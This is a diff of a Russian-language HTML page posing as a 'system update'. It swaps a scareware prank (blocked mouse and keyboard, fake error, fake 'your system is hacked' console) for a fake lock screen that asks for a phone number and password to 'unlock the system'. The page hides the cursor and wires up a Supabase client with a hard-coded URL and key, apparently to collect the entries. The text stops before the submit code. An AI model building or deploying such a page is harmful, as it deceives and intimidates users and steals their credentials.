@@ -3,137 +3,85 @@
 <head>
     <title>Системное обновление</title>
     <style>
-                /* Полностью скрываем курсор */
-        body, html {
-            cursor: none !important;
-        }
-        
-        /* Дополнительно блокируем выделение текста */
         body {
-            user-select: none;
-            -webkit-user-select: none;
-        }
-        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
             margin: 0;
             padding: 0;
-            font-family: 'Consolas', monospace;
-            background: #000;
-            color: red;
-            height: 100vh;
-            overflow: hidden;
             display: flex;
             justify-content: center;
             align-items: center;
-            text-align: center;
+            height: 100vh;
             cursor: none;
         }
-        #fake-error {
-            font-size: 24px;
-            text-shadow: 0 0 5px red;
-        }
-        #hack-console {
+        
+        #modal {
             display: none;
-            white-space: pre;
-            line-height: 1.5;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            width: 300px;
+            text-align: center;
         }
-        .blink { animation: blink 0.7s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
+        
+        #modal h2 {
+            color: red;
+            margin-bottom: 20px;
+        }
+        
+        #modal input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        
+        #modal button {
+            background: #0078d7;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        #overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 999;
+        }
     </style>
 </head>
 <body>
-    <!-- Фейковая ошибка -->
-    <div id="fake-error">
-        <p>ОШИБКА ГРАФИЧЕСКОГО ДВИЖКА (Код: 0xFA11)</p>
-        <p>Для продолжения работы нажмите <span class="blink">F11</span></p>
-        <p id="fake-timer">Автоматическое исправление через: 5 сек</p>
-    </div>
+    <!-- Оверлей (затемнение фона) -->
+    <div id="overlay"></div>
     
-    <!-- Настоящий "взлом" (покажется после F11) -->
-    <div id="hack-console"></div>
+    <!-- Модальное окно -->
+    <div id="modal">
+        <h2>ТРЕБУЕТСЯ ПОДТВЕРЖДЕНИЕ</h2>
+        <p>Введите данные для разблокировки системы:</p>
+        <input type="tel" id="phone" placeholder="Номер телефона" required>
+        <input type="password" id="password" placeholder="Пароль" required>
+        <button id="submit">ПОДТВЕРДИТЬ</button>
+    </div>
+
+    <!-- Подключаем Supabase JS -->
     <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
     <script>
-                // Блокируем ВСЕ события мыши
-        document.addEventListener('mousedown', e => e.preventDefault(), {capture: true});
-        document.addEventListener('mouseup', e => e.preventDefault(), {capture: true});
-        document.addEventListener('click', e => e.preventDefault(), {capture: true});
-        document.addEventListener('dblclick', e => e.preventDefault(), {capture: true});
-        document.addEventListener('contextmenu', e => e.preventDefault(), {capture: true});
-        document.addEventListener('mousemove', e => e.preventDefault(), {capture: true});
-        
-        // Блокируем колесико мыши
-        document.addEventListener('wheel', e => e.preventDefault(), {passive: false});
-        
-        // Блокируем тачпад (для ноутбуков)
-        document.addEventListener('touchstart', e => e.preventDefault(), {passive: false});
-                // Двойная защита через JavaScript
-        document.body.style.cursor = 'none';
-        
-        // Блокируем правую кнопку мыши (опционально)
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-        });
-        // 1. Блокируем всё, кроме F11
-        document.addEventListener('keydown', (e) => {
-            if (e.key !== 'F11') {
-                // Подменяем любую клавишу на "F11" в подсказке
-                document.getElementById('fake-error').innerHTML = `
-                    <p>НЕВЕРНАЯ КЛАВИША!</p>
-                    <p>Нажмите <span class="blink">F11</span>, иначе система будет перезагружена</p>
-                `;
-                
-                // Запугиваем звуком
-                playErrorSound();
-            }
-        });
-        
-        // 2. Фейковый таймер
-        let seconds = 5;
-        const timer = setInterval(() => {
-            document.getElementById('fake-timer').textContent = 
-                `Автоматическое исправление через: ${seconds} сек`;
-            seconds--;
-            
-            if (seconds < 0) {
-                clearInterval(timer);
-                document.getElementById('fake-error').innerHTML = `
-                    <p>СИСТЕМА НЕ ОТВЕЧАЕТ</p>
-                    <p>СРОЧНО НАЖМИТЕ <span class="blink">F11</span></p>
-                `;
-                playErrorSound();
-            }
-        }, 1000);
-        
-        // 3. Когда пользователь нажмёт F11 - запускаем "взлом"
-        document.addEventListener('keyup', (e) => {
-            if (e.key === 'F11') {
-                document.getElementById('fake-error').style.display = 'none';
-                document.getElementById('hack-console').style.display = 'block';
-                startRealHack();
-            }
-        });
-        
-        // 4. Настоящий "взлом" (после F11)
-        async function startRealHack() {
-            const consoleElem = document.getElementById('hack-console');
-            
-            const print = async (text, delay = 50) => {
-                for (let char of text) {
-                    consoleElem.innerHTML += char;
-                    await new Promise(r => setTimeout(r, delay));
-                }
-                consoleElem.innerHTML += '\n';
-            };
-            
-            await print('> ВЗЛОМ ИНИЦИАЛИЗИРОВАН');
-            await print('> Ваш IP: 192.168.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255));
-            await print('> Поиск уязвимостей... УСПЕШНО');
-            await print('> Подключаемся к камере... АКТИВИРОВАНА');
-            await print('> Доступ к паролям... ПОЛУЧЕН');
-            await print('\nВАША СИСТЕМА ВЗЛОМАНА!');
-            await print('Это шутка, но F11 ты уже нажал :)');
-            await print('<span class="blink">Нажми F5 чтобы выйти</span>');
-        }
-                // Инициализация Supabase (замени на свои данные!)
+        // Инициализация Supabase (замени на свои данные!)
         const supabaseUrl = 'https://vrzghglpkndfmvpdowqk.supabase.co';
         const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZyemdoZ2xwa25kZm12cGRvd3FrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTM4ODI1ODksImV4cCI6MjA2OTQ1ODU4OX0.ZbdPGGBoDK84V1okPLvAbdkyxvugg35DWHGPzYqFWQU';
         const supabase = supabase.createClient(supabaseUrl, supabaseKey);
